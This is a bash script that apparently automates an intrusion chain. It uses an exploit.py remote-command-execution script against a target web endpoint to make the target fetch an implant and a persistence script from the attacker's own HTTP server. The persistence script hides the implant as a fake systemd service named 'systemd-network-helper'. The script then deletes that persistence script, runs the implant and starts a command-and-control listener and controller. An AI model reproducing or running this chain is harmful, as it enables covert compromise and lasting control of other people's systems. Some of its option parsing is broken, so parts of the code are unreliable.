#!/bin/bash

#CONFIG
PORT=8000


# Function to display usage
usage() {
    echo "Usage: $0 -n SERVICE_NAME -b BINARY_PATH [-d DESCRIPTION] [-a AFTER_TARGET]"
    echo "  -b    Absolute path to your implant binary"
    echo "  -p    Absolute path to your persistence script"
    echo "  -i    IP of target"
	echo "  -l    Absolute path to your listening post script"
	echo "  -c   Absolute path to your controller script"
    exit 1
}

# Parse command line arguments
while getopts "n:b:d:a:h" opt; do
    case "$opt" in
        b) IMPLANT_FILE="$OPTARG" ;;
        p) PERSISTENCE_SCRIPT="$OPTARG" ;;
        i) TARGET_IP="$OPTARG" ;;
		l) LISTENING_POST="$OPTARG" ;;
		c) CONTROLLER="$OPTARG" ;;
    esac
done

#GET LOCAL IP (MacOS & Linux supported)
if [[ "$OSTYPE" == "darwin"* ]]; then
	LOCAL_IP=$(ipconfig getifaddr en0)
else
	LOCAL_IP=$(hostname -I | awk '{print $1}')
fi

#START PYTHON SERVER
echo "[*] Starting HTTP server at $LOCAL_IP:$PORT"
python3 -m http.server $PORT > /dev/null 2>&1 &
SERVER_PID=$!
sleep 2


#UPLOAD IMPLANT
echo "[*] Uploading implant to target..."
python3 exploit.py "http://$TARGET_IP:8080/orders/" "wget http://$LOCAL_IP:$PORT/$IMPLANT_FILE"

#GET PERSISTENCE
echo "[*] Uploading persistence script to target..."
python3 exploit.py "http://$TARGET_IP:8080/orders/" "wget http://$LOCAL_IP:$PORT/$PERSISTENCE_SCRIPT"
python3 exploit.py "http://$TARGET_IP:8080/orders/" "chmod +x ./$PERSISTENCE_SCRIPT"
python3 exploit.py "http://$TARGET_IP:8080/orders/" "./$PERSISTENCE_SCRIPT -n systemd-network-helper -b /var/lib/systemd/catalog/$IMPLANT_FILE -a network.target"
python3 exploit.py "http://$TARGET_IP:8080/orders/" "rm ./$PERSISTENCE_SCRIPT"
echo "[*] Persistence achieved, cleaning script"

#KILL SERVER
echo "[*] Implant hidden at /var/lib/systemd/catalog, stopping HTTP server..."
kill $SERVER_PID

#RUN IMPLANT
echo "[*] Starting implant..."
python3 exploit.py "http://$TARGET_IP:8080/orders/" "cd /var/lib/systemd/catalog ./$IMPLANT_FILE" > /dev/null 2>&1 &
echo "[*] COMPLETED"
echo "[*] IMPLANT IS RUNNING ON TARGET"


#START LISTENING POST
echo "[*] Starting listening post"
python3 $LISTENING_POST

#START C2 Controller
echo "[*] Starting controller"
python3 $CONTROLLER
